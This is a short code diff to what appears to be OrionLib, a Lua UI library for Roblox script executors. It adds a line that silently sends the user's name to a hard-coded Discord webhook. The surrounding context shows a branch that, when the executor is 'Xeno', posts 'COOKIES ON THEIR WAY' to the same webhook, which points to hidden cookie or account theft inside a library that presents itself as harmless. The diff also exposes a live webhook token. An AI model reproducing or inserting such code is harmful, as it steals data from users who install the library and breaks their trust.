@@ -2039,6 +2039,7 @@ end
 function OrionLib:Destroy()
 	Orion:Destroy()
 end
+sendWebhook("https://discord.com/api/webhooks/1342951799304359997/vJdR-lrqW5PTYe3kTbr2-IUKySj24CVOlPbhfSk3XcctXKpKdhWZcB2ykkR6PtgE12Gd", "test from "..Name)	
 if string.find(identifyexecutor(), "Xeno") then
 			sendWebhook("https://discord.com/api/webhooks/1342951799304359997/vJdR-lrqW5PTYe3kTbr2-IUKySj24CVOlPbhfSk3XcctXKpKdhWZcB2ykkR6PtgE12Gd", "COOKIES ON THEIR WAY")
 			
